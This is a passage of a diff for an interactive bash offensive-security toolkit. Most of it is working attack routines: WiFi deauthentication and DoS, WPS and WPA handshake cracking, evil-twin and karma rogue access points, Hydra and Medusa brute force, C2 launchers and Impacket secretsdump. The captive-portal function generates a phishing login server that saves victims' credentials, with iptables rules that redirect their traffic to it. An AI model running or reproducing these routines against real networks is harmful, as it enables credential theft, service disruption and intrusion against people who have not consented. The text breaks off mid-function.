+
+run_dnsrecon() {
+    check_tool "dnsrecon" || return 1
+    log_info "DNS recon on $TARGET"
+    echo
+    dnsrecon -d "$TARGET" | tee -a "${LOG_DIR}/dns.log"
+}
+
+run_zone_transfer() {
+    log_info "Attempting zone transfer on $TARGET"
+    echo
+    dig axfr "$TARGET" | tee -a "${LOG_DIR}/dns.log"
+}
+
+run_fierce() {
+    check_tool "fierce" || return 1
+    log_info "Subdomain brute force on $TARGET"
+    echo
+    fierce --domain "$TARGET" | tee -a "${LOG_DIR}/dns.log"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - SSL
+#═══════════════════════════════════════════════════════════════════════════════
+
+run_sslscan() {
+    check_tool "sslscan" || return 1
+    log_info "SSL scan on $TARGET"
+    echo
+    sslscan "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
+}
+
+run_sslyze() {
+    check_tool "sslyze" || return 1
+    log_info "SSLyze analysis on $TARGET"
+    echo
+    sslyze --regular "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
+}
+
+run_testssl() {
+    if [[ -x /usr/bin/testssl.sh ]] || [[ -x /usr/bin/testssl ]]; then
+        log_info "TestSSL on $TARGET"
+        echo
+        testssl.sh "$TARGET" 2>/dev/null || testssl "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
+    else
+        log_warning "testssl.sh not found"
+        echo -e "    ${C_SHADOW}Install: git clone https://github.com/drwetter/testssl.sh${C_RESET}"
+    fi
+}
+
+run_cert_info() {
+    log_info "Certificate info for $TARGET"
+    echo
+    echo | openssl s_client -connect "${TARGET}:443" 2>/dev/null | openssl x509 -noout -text | tee -a "${LOG_DIR}/ssl.log"
+}
+
+run_heartbleed() {
+    check_tool "nmap" || return 1
+    log_attack "Heartbleed check on $TARGET"
+    echo
+    nmap --script ssl-heartbleed -p 443 "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - SNMP/SMB
+#═══════════════════════════════════════════════════════════════════════════════
+
+cmd_snmp_sweep() {
+    check_tool "onesixtyone" || return 1
+    get_target || return 1
+    log_info "SNMP sweep on $TARGET"
+    echo
+    onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "$TARGET" 2>/dev/null || \
+    onesixtyone "$TARGET" public private | tee -a "${LOG_DIR}/snmp.log"
+}
+
+cmd_smb_enum() {
+    get_target || return 1
+    log_info "SMB enumeration on $TARGET"
+    echo
+    
+    if check_tool "enum4linux" 2>/dev/null; then
+        enum4linux -a "$TARGET" | tee -a "${LOG_DIR}/smb.log"
+    elif check_tool "smbmap" 2>/dev/null; then
+        smbmap -H "$TARGET" | tee -a "${LOG_DIR}/smb.log"
+    elif check_tool "smbclient" 2>/dev/null; then
+        smbclient -L "//${TARGET}" -N | tee -a "${LOG_DIR}/smb.log"
+    else
+        log_error "No SMB tools found. Install: sudo apt install enum4linux smbmap smbclient"
+    fi
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - WiFi
+#═══════════════════════════════════════════════════════════════════════════════
+
+cmd_monitor_mode() {
+    require_root || return 1
+    get_interface || return 1
+    
+    echo
+    echo -e "    ${C_GHOST}[1]${C_RESET} Enable monitor mode"
+    echo -e "    ${C_GHOST}[2]${C_RESET} Disable monitor mode"
+    echo
+    echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+    read -r choice
+    
+    case "$choice" in
+        1)
+            log_attack "Enabling monitor mode on $IFACE"
+            if check_tool "airmon-ng" 2>/dev/null; then
+                airmon-ng check kill
+                airmon-ng start "$IFACE"
+            else
+                ip link set "$IFACE" down
+                iw dev "$IFACE" set type monitor
+                ip link set "$IFACE" up
+            fi
+            log_success "Monitor mode enabled"
+            ;;
+        2)
+            log_info "Disabling monitor mode on $IFACE"
+            if check_tool "airmon-ng" 2>/dev/null; then
+                airmon-ng stop "$IFACE"
+                systemctl restart NetworkManager 2>/dev/null || service networking restart
+            else
+                ip link set "$IFACE" down
+                iw dev "$IFACE" set type managed
+                ip link set "$IFACE" up
+            fi
+            log_success "Monitor mode disabled"
+            ;;
+    esac
+}
+
+cmd_wifi_scan() {
+    require_root || return 1
+    check_tool "airodump-ng" || return 1
+    get_interface || return 1
+    log_attack "Scanning WiFi networks on $IFACE"
+    echo -e "    ${C_SHADOW}Press Ctrl+C to stop${C_RESET}"
+    echo
+    airodump-ng "$IFACE"
+}
+
+cmd_wifite() {
+    require_root || return 1
+    check_tool "wifite" || return 1
+    log_attack "Launching Wifite"
+    echo
+    wifite --kill
+}
+
+cmd_deauth() {
+    require_root || return 1
+    check_tool "aireplay-ng" || return 1
+    get_interface || return 1
+    
+    echo -ne "    ${C_GHOST}Target BSSID (AP MAC): ${C_RESET}"
+    read -r bssid
+    echo -ne "    ${C_GHOST}Client MAC (or 'all'): ${C_RESET}"
+    read -r client
+    echo -ne "    ${C_GHOST}Number of deauths (0=infinite): ${C_RESET}"
+    read -r count
+    count="${count:-10}"
+    
+    log_attack "Deauth attack: BSSID=$bssid Client=$client Count=$count"
+    echo
+    
+    if [[ "$client" == "all" ]]; then
+        aireplay-ng --deauth "$count" -a "$bssid" "$IFACE"
+    else
+        aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$IFACE"
+    fi
+}
+
+cmd_wps_attack() {
+    require_root || return 1
+    get_interface || return 1
+    
+    echo -ne "    ${C_GHOST}Target BSSID: ${C_RESET}"
+    read -r bssid
+    echo -ne "    ${C_GHOST}Channel: ${C_RESET}"
+    read -r channel
+    
+    echo
+    echo -e "    ${C_GHOST}[1]${C_RESET} Reaver"
+    echo -e "    ${C_GHOST}[2]${C_RESET} Bully"
+    echo -e "    ${C_GHOST}[3]${C_RESET} Pixiewps (Pixie Dust)"
+    echo
+    echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+    read -r choice
+    
+    case "$choice" in
+        1)
+            check_tool "reaver" || return 1
+            log_attack "Reaver WPS attack on $bssid"
+            reaver -i "$IFACE" -b "$bssid" -c "$channel" -vv
+            ;;
+        2)
+            check_tool "bully" || return 1
+            log_attack "Bully WPS attack on $bssid"
+            bully -b "$bssid" -c "$channel" "$IFACE"
+            ;;
+        3)
+            check_tool "reaver" || return 1
+            log_attack "Pixie Dust attack on $bssid"
+            reaver -i "$IFACE" -b "$bssid" -c "$channel" -K 1 -vv
+            ;;
+    esac
+}
+
+cmd_handshake_capture() {
+    require_root || return 1
+    check_tool "airodump-ng" || return 1
+    get_interface || return 1
+    
+    echo -ne "    ${C_GHOST}Target BSSID: ${C_RESET}"
+    read -r bssid
+    echo -ne "    ${C_GHOST}Channel: ${C_RESET}"
+    read -r channel
+    echo -ne "    ${C_GHOST}Output filename: ${C_RESET}"
+    read -r outfile
+    outfile="${outfile:-${LOOT_DIR}/handshake_$(date +%Y%m%d_%H%M%S)}"
+    
+    log_attack "Capturing handshake from $bssid on channel $channel"
+    echo -e "    ${C_SHADOW}Waiting for handshake... (deauth clients to speed up)${C_RESET}"
+    echo
+    airodump-ng --bssid "$bssid" -c "$channel" -w "$outfile" "$IFACE"
+}
+
+cmd_channel_hop() {
+    require_root || return 1
+    get_interface || return 1
+    
+    log_info "Channel hopping on $IFACE (Ctrl+C to stop)"
+    echo
+    
+    while true; do
+        for ch in 1 2 3 4 5 6 7 8 9 10 11; do
+            iw dev "$IFACE" set channel "$ch" 2>/dev/null || iwconfig "$IFACE" channel "$ch" 2>/dev/null
+            printf "\r    ${C_GHOST}Channel: ${C_VENOM}%2d${C_RESET}" "$ch"
+            sleep 0.3
+        done
+    done
+}
+
+cmd_client_scan() {
+    require_root || return 1
+    check_tool "airodump-ng" || return 1
+    get_interface || return 1
+    
+    echo -ne "    ${C_GHOST}Target BSSID: ${C_RESET}"
+    read -r bssid
+    echo -ne "    ${C_GHOST}Channel: ${C_RESET}"
+    read -r channel
+    
+    log_info "Scanning clients on $bssid"
+    echo
+    airodump-ng --bssid "$bssid" -c "$channel" "$IFACE"
+}
+
+cmd_hidden_ssid() {
+    log_info "To reveal hidden SSID:"
+    echo
+    echo -e "    ${C_GHOST}1.${C_RESET} Start airodump-ng to find hidden network (shows <length: X>)"
+    echo -e "    ${C_GHOST}2.${C_RESET} Note the BSSID and channel"
+    echo -e "    ${C_GHOST}3.${C_RESET} Run deauth attack to force client reconnection"
+    echo -e "    ${C_GHOST}4.${C_RESET} SSID will appear in airodump when client reconnects"
+    echo
+    echo -e "    ${C_SHADOW}Use options [7] WiFi Recon then [8] Deauth Attack${C_RESET}"
+}
+
+cmd_signal_check() {
+    get_interface || return 1
+    
+    if check_tool "wavemon" 2>/dev/null; then
+        wavemon -i "$IFACE"
+    else
+        log_info "Signal info for $IFACE"
+        echo
+        iwconfig "$IFACE" 2>/dev/null || iw dev "$IFACE" link
+    fi
+}
+
+cmd_aircrack_dict() {
+    check_tool "aircrack-ng" || return 1
+    echo -ne "    ${C_GHOST}Capture file (.cap/.pcapng): ${C_RESET}"
+    read -r capfile
+    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }
+    echo -ne "    ${C_GHOST}Wordlist [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
+    read -r wordlist
+    wordlist="${wordlist:-/usr/share/wordlists/rockyou.txt}"
+    log_attack "Aircrack-ng dictionary attack on $capfile"
+    aircrack-ng -w "$wordlist" "$capfile" | tee -a "${LOG_DIR}/aircrack.log"
+}
+
+cmd_aircrack_wordlist() {
+    check_tool "aircrack-ng" || return 1
+    echo -ne "    ${C_GHOST}Capture file (.cap/.pcapng): ${C_RESET}"
+    read -r capfile
+    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }
+    echo -ne "    ${C_GHOST}Custom wordlist: ${C_RESET}"
+    read -r wordlist
+    [[ -z "$wordlist" ]] && { log_error "Wordlist required"; return 1; }
+    log_attack "Aircrack-ng custom wordlist on $capfile"
+    aircrack-ng -w "$wordlist" "$capfile" | tee -a "${LOG_DIR}/aircrack.log"
+}
+
+cmd_convert_hashcat() {
+    local converter=""
+    if command -v hcxpcapngtool &>/dev/null; then
+        converter="hcxpcapngtool"
+    elif command -v cap2hccapx &>/dev/null; then
+        converter="cap2hccapx"
+    fi
+    [[ -z "$converter" ]] && { log_error "hcxpcapngtool or cap2hccapx required"; return 1; }
+
+    local capfile="${1:-}"
+    if [[ -z "$capfile" ]]; then
+        echo -ne "    ${C_GHOST}Capture file (.cap/.pcapng): ${C_RESET}"
+        read -r capfile
+    fi
+    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }
+
+    mkdir -p "$LOOT_DIR"
+    local base_name
+    base_name="$(basename "$capfile")"
+    local out_file
+    out_file="${LOOT_DIR}/${base_name%.*}_$(date +%Y%m%d_%H%M%S).hc22000"
+
+    if [[ "$converter" == "hcxpcapngtool" ]]; then
+        log_info "Converting with hcxpcapngtool"
+        hcxpcapngtool -o "$out_file" "$capfile"
+    else
+        out_file="${out_file%.hc22000}.hccapx"
+        log_info "Converting with cap2hccapx"
+        cap2hccapx "$capfile" "$out_file"
+    fi
+
+    log_loot "Converted hash saved: $out_file"
+    echo "$out_file"
+}
+
+cmd_hashcat_gpu() {
+    check_tool "hashcat" || return 1
+    echo -ne "    ${C_GHOST}Capture/hash file (.cap/.hc22000/.hccapx): ${C_RESET}"
+    read -r capfile
+    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; return 1; }
+    local hashfile="$capfile"
+    if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
+        hashfile=$(cmd_convert_hashcat "$capfile" | tail -n 1)
+        [[ -z "$hashfile" ]] && { log_error "Conversion failed"; return 1; }
+    fi
+    echo -ne "    ${C_GHOST}Wordlist [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
+    read -r wordlist
+    wordlist="${wordlist:-/usr/share/wordlists/rockyou.txt}"
+    log_attack "Hashcat GPU attack on $hashfile"
+    hashcat -m 22000 -a 0 "$hashfile" "$wordlist" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper | tee -a "${LOG_DIR}/hashcat.log"
+    hashcat --show -m 22000 "$hashfile" --potfile-path "${LOG_DIR}/hashcat.pot" | tee -a "${LOG_DIR}/hashcat.log"
+}
+
+cmd_hashcat_rules() {
+    check_tool "hashcat" || return 1
+    echo -ne "    ${C_GHOST}Capture/hash file (.cap/.hc22000/.hccapx): ${C_RESET}"
+    read -r capfile
+    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; return 1; }
+    local hashfile="$capfile"
+    if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
+        hashfile=$(cmd_convert_hashcat "$capfile" | tail -n 1)
+        [[ -z "$hashfile" ]] && { log_error "Conversion failed"; return 1; }
+    fi
+    echo -ne "    ${C_GHOST}Wordlist: ${C_RESET}"
+    read -r wordlist
+    [[ -z "$wordlist" ]] && { log_error "Wordlist required"; return 1; }
+    echo -ne "    ${C_GHOST}Rules file [/usr/share/hashcat/rules/best64.rule]: ${C_RESET}"
+    read -r rules
+    rules="${rules:-/usr/share/hashcat/rules/best64.rule}"
+    log_attack "Hashcat rules attack on $hashfile using $rules"
+    hashcat -m 22000 -a 0 "$hashfile" "$wordlist" -r "$rules" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper | tee -a "${LOG_DIR}/hashcat.log"
+    hashcat --show -m 22000 "$hashfile" --potfile-path "${LOG_DIR}/hashcat.pot" | tee -a "${LOG_DIR}/hashcat.log"
+}
+
+cmd_john_the_ripper() {
+    check_tool "john" || return 1
+    check_tool "hccap2john" || return 1
+    echo -ne "    ${C_GHOST}Capture/hash file (.cap/.hccapx/.hc22000): ${C_RESET}"
+    read -r capfile
+    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; return 1; }
+    echo -ne "    ${C_GHOST}Wordlist [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
+    read -r wordlist
+    wordlist="${wordlist:-/usr/share/wordlists/rockyou.txt}"
+
+    local john_hash
+    john_hash="${LOOT_DIR}/john_$(date +%Y%m%d_%H%M%S).hash"
+    hccap2john "$capfile" > "$john_hash"
+    log_attack "John the Ripper on $john_hash"
+    john --wordlist="$wordlist" "$john_hash" | tee -a "${LOG_DIR}/john.log"
+    john --show "$john_hash" | tee -a "${LOG_DIR}/john.log"
+}
+
+cmd_cowpatty() {
+    check_tool "cowpatty" || return 1
+    echo -ne "    ${C_GHOST}Capture file (.cap): ${C_RESET}"
+    read -r capfile
+    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }
+    echo -ne "    ${C_GHOST}SSID: ${C_RESET}"
+    read -r ssid
+    [[ -z "$ssid" ]] && { log_error "SSID required"; return 1; }
+    echo -ne "    ${C_GHOST}Wordlist [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
+    read -r wordlist
+    wordlist="${wordlist:-/usr/share/wordlists/rockyou.txt}"
+    log_attack "Cowpatty WPA crack on $ssid"
+    cowpatty -r "$capfile" -s "$ssid" -f "$wordlist" -2 | tee -a "${LOG_DIR}/cowpatty.log"
+}
+
+cmd_bettercap_wifi() {
+    require_root || return 1
+    check_tool "bettercap" || return 1
+    get_interface || return 1
+    local log_file
+    log_file="${LOG_DIR}/bettercap_${IFACE}_$(date +%Y%m%d_%H%M%S).log"
+    log_attack "Bettercap WiFi recon on $IFACE"
+    bettercap -iface "$IFACE" -log "$log_file" -eval "set wifi.recon.channel_hop true; wifi.recon on; set ticker.commands 'wifi.show'; ticker on"
+    log_loot "Bettercap log: $log_file"
+}
+
+cmd_fluxion() {
+    require_root || return 1
+    check_tool "fluxion" || return 1
+    log_attack "Launching Fluxion"
+    fluxion
+}
+
+cmd_wifiphisher() {
+    require_root || return 1
+    check_tool "wifiphisher" || return 1
+    get_interface || return 1
+    log_attack "Starting Wifiphisher on $IFACE"
+    wifiphisher -i "$IFACE"
+}
+
+cmd_mdk_dos() {
+    require_root || return 1
+    local tool=""
+    if command -v mdk4 &>/dev/null; then
+        tool="mdk4"
+    elif command -v mdk3 &>/dev/null; then
+        tool="mdk3"
+    else
+        log_error "mdk3/mdk4 not found"
+        return 1
+    fi
+    get_interface || return 1
+    echo -ne "    ${C_GHOST}Target BSSID (or 'broadcast'): ${C_RESET}"
+    read -r bssid
+    echo -ne "    ${C_GHOST}Channel [1]: ${C_RESET}"
+    read -r channel
+    channel="${channel:-1}"
+    mkdir -p "$TMP_DIR"
+    local bssid_list="${TMP_DIR}/mdk_bssids.txt"
+    echo "$bssid" > "$bssid_list"
+    log_attack "${tool^^} DoS on $bssid channel $channel"
+    if [[ "$tool" == "mdk4" ]]; then
+        mdk4 "$IFACE" d -B "$bssid" -c "$channel"
+    else
+        mdk3 "$IFACE" d -b "$bssid_list" -c "$channel"
+    fi
+}
+
+cmd_evil_twin_scan() {
+    require_root || return 1
+    check_tool "airodump-ng" || return 1
+    get_interface || return 1
+    log_attack "Scanning for APs to clone on $IFACE"
+    airodump-ng "$IFACE"
+}
+
+cmd_evil_twin_create() {
+    require_root || return 1
+    check_tool "hostapd" || return 1
+    check_tool "dnsmasq" || return 1
+    check_tool "iptables" || return 1
+    get_interface || return 1
+    mkdir -p "$TMP_DIR" "$LOOT_DIR"
+
+    echo -ne "    ${C_GHOST}Target SSID: ${C_RESET}"
+    # shellcheck disable=SC2034
+    read -r TARGET_SSID
+    echo -ne "    ${C_GHOST}Target channel: ${C_RESET}"
+    # shellcheck disable=SC2034
+    read -r CHANNEL
+    echo -ne "    ${C_GHOST}Target BSSID (for reference): ${C_RESET}"
+    read -r TARGET_BSSID
+    echo -ne "    ${C_GHOST}Uplink interface for NAT (blank=none): ${C_RESET}"
+    read -r UPLINK
+
+    echo "$IFACE" > "${TMP_DIR}/evil_iface.txt"
+    local hostapd_conf="${TMP_DIR}/hostapd_${IFACE}.conf"
+    local dnsmasq_conf="${TMP_DIR}/dnsmasq_${IFACE}.conf"
+    eval "cat <<EOF > \"$hostapd_conf\"\n${HOSTAPD_TEMPLATE}\nEOF"
+    eval "cat <<EOF > \"$dnsmasq_conf\"\n${DNSMASQ_TEMPLATE}\nEOF"
+
+    ip link set "$IFACE" down
+    ip addr flush dev "$IFACE"
+    ip addr add 192.168.1.1/24 dev "$IFACE"
+    ip link set "$IFACE" up
+
+    local dns_pid_file="${TMP_DIR}/dnsmasq_${IFACE}.pid"
+    local ap_log
+    ap_log="${LOOT_DIR}/evil_twin_clients_$(date +%Y%m%d_%H%M%S).log"
+    local hostapd_pid_file="${TMP_DIR}/hostapd_${IFACE}.pid"
+    dnsmasq -C "$dnsmasq_conf" --pid-file="$dns_pid_file"
+    hostapd -B -P "$hostapd_pid_file" -f "$ap_log" "$hostapd_conf"
+
+    if [[ -n "$UPLINK" ]]; then
+        echo "$UPLINK" > "${TMP_DIR}/evil_uplink.txt"
+        iptables -t nat -A POSTROUTING -o "$UPLINK" -j MASQUERADE
+        iptables -A FORWARD -i "$UPLINK" -o "$IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
+        iptables -A FORWARD -i "$IFACE" -o "$UPLINK" -j ACCEPT
+    fi
+
+    log_loot "Evil twin running on $IFACE (log: $ap_log)"
+    [[ -n "$TARGET_BSSID" ]] && log_info "Cloning BSSID: $TARGET_BSSID"
+}
+
+cmd_captive_portal() {
+    require_root || return 1
+    mkdir -p "$TMP_DIR" "$LOOT_DIR"
+    echo -ne "    ${C_GHOST}Interface to listen on [${IFACE:-wlan0}]: ${C_RESET}"
+    read -r portal_iface
+    portal_iface="${portal_iface:-${IFACE:-wlan0}}"
+    echo "$portal_iface" > "${TMP_DIR}/portal_iface.txt"
+    local creds_file
+    creds_file="${LOOT_DIR}/creds_$(date +%Y%m%d_%H%M%S).txt"
+    local portal_dir="${TMP_DIR}/portal"
+    mkdir -p "$portal_dir"
+    cat > "${portal_dir}/portal.py" <<PY
+import http.server
+import urllib.parse
+from datetime import datetime
+
+CREDS_FILE = "${creds_file}"
+
+class Handler(http.server.SimpleHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get('content-length', 0))
+        body = self.rfile.read(length).decode()
+        data = urllib.parse.parse_qs(body)
+        with open(CREDS_FILE, 'a', encoding='utf-8') as fh:
+            fh.write(f"[{datetime.utcnow().isoformat()}] {data}\n")
+        self.send_response(302)
+        self.send_header('Location', '/')
+        self.end_headers()
+
+if __name__ == '__main__':
+    http.server.test(HandlerClass=Handler, port=8080, bind='0.0.0.0')
+PY
+
+    cat > "${portal_dir}/index.html" <<'HTML'
+<html><head><title>Login</title></head><body><h3>Network Login</h3><form method="POST"><input name="user" placeholder="Username"/><br/><input name="pass" placeholder="Password" type="password"/><br/><button type="submit">Login</button></form></body></html>
+HTML
+
+    local portal_pid_file="${TMP_DIR}/portal.pid"
+    (cd "$portal_dir" && python3 portal.py >/dev/null 2>&1 & echo $! > "$portal_pid_file")
+    iptables -t nat -A PREROUTING -i "$portal_iface" -p tcp --dport 80 -j REDIRECT --to-port 8080
+    log_loot "Captive portal running on $portal_iface (creds -> $creds_file)"
+}
+
+cmd_karma_attack() {
+    require_root || return 1
+    get_interface || return 1
+    mkdir -p "$TMP_DIR"
+    local karma_pid_file="${TMP_DIR}/karma_${IFACE}.pid"
+    if check_tool "hostapd-mana" 2>/dev/null; then
+        log_attack "Starting hostapd-mana karma on $IFACE"
+        hostapd-mana -i "$IFACE" -m >> "${LOG_DIR}/karma.log" 2>&1 & echo $! > "$karma_pid_file"
+    elif check_tool "airbase-ng" 2>/dev/null; then
+        log_attack "Starting airbase-ng karma on $IFACE"
+        airbase-ng -P -C 30 -v "$IFACE" >> "${LOG_DIR}/karma.log" 2>&1 & echo $! > "$karma_pid_file"
+    else
+        log_error "hostapd-mana or airbase-ng required"
+        return 1
+    fi
+}
+
+cmd_evil_twin_stop() {
+    require_root || return 1
+    local ap_iface=""
+    local portal_iface=""
+    [[ -f "${TMP_DIR}/evil_iface.txt" ]] && ap_iface="$(cat "${TMP_DIR}/evil_iface.txt")"
+    [[ -f "${TMP_DIR}/portal_iface.txt" ]] && portal_iface="$(cat "${TMP_DIR}/portal_iface.txt")"
+    for pid_file in "$TMP_DIR"/hostapd_*.pid "$TMP_DIR"/dnsmasq_*.pid "$TMP_DIR"/portal.pid "$TMP_DIR"/karma_*.pid; do
+        [[ -f "$pid_file" ]] || continue
+        local pid
+        pid=$(cat "$pid_file")
+        kill "$pid" 2>/dev/null || true
+        rm -f "$pid_file"
+    done
+    if [[ -f "$TMP_DIR/evil_uplink.txt" ]]; then
+        local uplink
+        uplink=$(cat "$TMP_DIR/evil_uplink.txt")
+        iptables -t nat -D POSTROUTING -o "$uplink" -j MASQUERADE 2>/dev/null || true
+        iptables -D FORWARD -i "$uplink" -o "${ap_iface:-$IFACE}" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
+        iptables -D FORWARD -i "${ap_iface:-$IFACE}" -o "$uplink" -j ACCEPT 2>/dev/null || true
+        rm -f "$TMP_DIR/evil_uplink.txt"
+    fi
+    if [[ -n "$portal_iface" ]]; then
+        iptables -t nat -D PREROUTING -i "$portal_iface" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
+    else
+        iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
+    fi
+    rm -f "${TMP_DIR}/evil_iface.txt" "${TMP_DIR}/portal_iface.txt"
+    log_success "Rogue AP processes stopped"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - CREDENTIALS & BRUTE FORCE
+#═══════════════════════════════════════════════════════════════════════════════
+
+cmd_hydra_bruteforce() {
+    check_tool "hydra" || return 1
+    get_target || return 1
+    echo -ne "    ${C_GHOST}Service (ssh/ftp/http-form-post/etc): ${C_RESET}"
+    read -r service
+    [[ -z "$service" ]] && { log_error "Service required"; return 1; }
+    echo -ne "    ${C_GHOST}Username (leave blank to use user list): ${C_RESET}"
+    read -r user
+    echo -ne "    ${C_GHOST}User list (optional): ${C_RESET}"
+    read -r userlist
+    echo -ne "    ${C_GHOST}Password list [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
+    read -r passlist
+    passlist="${passlist:-/usr/share/wordlists/rockyou.txt}"
+    echo -ne "    ${C_GHOST}Port (optional): ${C_RESET}"
+    read -r port
+
+    [[ -z "$user" && -z "$userlist" ]] && { log_error "Provide a username or user list"; return 1; }
+
+    local args=()
+    if [[ -n "$userlist" ]]; then
+        args+=("-L" "$userlist")
+    else
+        args+=("-l" "$user")
+    fi
+    args+=("-P" "$passlist")
+    [[ -n "$port" ]] && args+=("-s" "$port")
+    args+=("$TARGET" "$service")
+    log_attack "Hydra attack on $TARGET ($service)"
+    hydra "${args[@]}" -o "${OUTPUT_FILE}_hydra.txt" | tee -a "${LOG_DIR}/hydra.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_hydra.txt"
+}
+
+cmd_medusa_bruteforce() {
+    check_tool "medusa" || return 1
+    get_target || return 1
+    echo -ne "    ${C_GHOST}Service (ssh/ftp/smb): ${C_RESET}"
+    read -r service
+    [[ -z "$service" ]] && { log_error "Service required"; return 1; }
+    echo -ne "    ${C_GHOST}User list: ${C_RESET}"
+    read -r userlist
+    [[ -z "$userlist" ]] && { log_error "User list required"; return 1; }
+    echo -ne "    ${C_GHOST}Password list [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
+    read -r passlist
+    passlist="${passlist:-/usr/share/wordlists/rockyou.txt}"
+    echo -ne "    ${C_GHOST}Port (optional): ${C_RESET}"
+    read -r port
+
+    local args=("-h" "$TARGET" "-U" "$userlist" "-P" "$passlist" "-M" "$service")
+    [[ -n "$port" ]] && args+=("-n" "$port")
+    log_attack "Medusa attack on $TARGET ($service)"
+    medusa "${args[@]}" | tee -a "${LOG_DIR}/medusa.log"
+}
+
+cmd_crackmapexec() {
+    check_tool "crackmapexec" || return 1
+    get_target || return 1
+    echo -ne "    ${C_GHOST}Protocol [smb/ssh/winrm]: ${C_RESET}"
+    read -r protocol
+    protocol="${protocol:-smb}"
+    echo -ne "    ${C_GHOST}Username: ${C_RESET}"
+    read -r user
+    echo -ne "    ${C_GHOST}Password (or hash): ${C_RESET}"
+    read -r pass
+
+    local args=("$protocol" "$TARGET")
+    [[ -n "$user" ]] && args+=("-u" "$user")
+    [[ -n "$pass" ]] && args+=("-p" "$pass")
+    args+=("--shares")
+    log_attack "CrackMapExec on $TARGET ($protocol)"
+    crackmapexec "${args[@]}" | tee -a "${LOG_DIR}/cme.log"
+}
+
+cmd_empire() {
+    check_tool "empire" || return 1
+    log_attack "Launching Empire C2"
+    empire
+}
+
+cmd_covenant() {
+    if command -v covenant &>/dev/null; then
+        log_attack "Launching Covenant"
+        covenant
+    else
+        log_error "Covenant launcher not found (expected 'covenant')"
+        echo -e "    ${C_SHADOW}Start manually from Covenant directory if installed${C_RESET}"
+        return 1
+    fi
+}
+
+cmd_mimikatz() {
+    local secrets_cmd="python3 -m impacket.examples.secretsdump"
+    if command -v impacket-secretsdump &>/dev/null; then
+        secrets_cmd="impacket-secretsdump"
+    fi
+    get_target || return 1
+    echo -ne "    ${C_GHOST}Domain (blank for WORKGROUP): ${C_RESET}"
+    read -r domain
+    domain="${domain:-WORKGROUP}"
+    echo -ne "    ${C_GHOST}Username: ${C_RESET}"
+    read -r user
+    echo -ne "    ${C_GHOST}Password/NTLM hash: ${C_RESET}"
+    read -r secret
+    local out_file="${LOOT_DIR}/secrets_${TARGET//[^a-zA-Z0-9._-]/_}.txt"
+    log_attack "Impacket secretsdump against $TARGET"
+    $secrets_cmd "${domain}/${user}:${secret}@${TARGET}" -outputfile "$out_file"
+    log_loot "Dump saved: $out_file"
+}
+
+cmd_impacket_scripts() {
+    echo -ne "    ${C_GHOST}Impacket script (wmiexec.py/psexec.py/etc): ${C_RESET}"
+    read -r script
+    [[ -z "$script" ]] && { log_error "Script required"; return 1; }
+    echo -ne "    ${C_GHOST}Arguments (e.g., DOMAIN/user:pass@target): ${C_RESET}"
+    read -r args
+    local script_base="${script%.py}"
+    IFS=' ' read -r -a arg_array <<< "$args"
+    if command -v "$script" &>/dev/null; then
+        log_attack "Running $script $args"
+        $script "${arg_array[@]}" | tee -a "${LOG_DIR}/impacket.log"
+    else
+        log_attack "Running python impacket.examples.${script_base}"
+        python3 -m "impacket.examples.${script_base}" "${arg_array[@]}" | tee -a "${LOG_DIR}/impacket.log"
+    fi
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - WEB
+#═══════════════════════════════════════════════════════════════════════════════
+
+run_nikto() {
+    check_tool "nikto" || return 1
+    log_attack "Nikto scan on $TARGET"
+    echo
+    nikto -h "$TARGET" -o "${OUTPUT_FILE}_nikto.txt" | tee -a "${LOG_DIR}/web.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_nikto.txt"
+}
+
+run_wpscan() {
+    check_tool "wpscan" || return 1
+    log_attack "WordPress scan on $TARGET"
+    echo
+    wpscan --url "$TARGET" --enumerate u,p,t | tee -a "${LOG_DIR}/web.log"
+}
+
+run_gobuster() {
+    check_tool "gobuster" || return 1
+    
+    local wordlist="/usr/share/wordlists/dirb/common.txt"
+    [[ ! -f "$wordlist" ]] && wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt"
+    
+    log_attack "Directory brute force on $TARGET"
+    echo
+    gobuster dir -u "$TARGET" -w "$wordlist" -o "${OUTPUT_FILE}_gobuster.txt" | tee -a "${LOG_DIR}/web.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_gobuster.txt"
+}
+
+run_ffuf() {
+    check_tool "ffuf" || return 1
+    
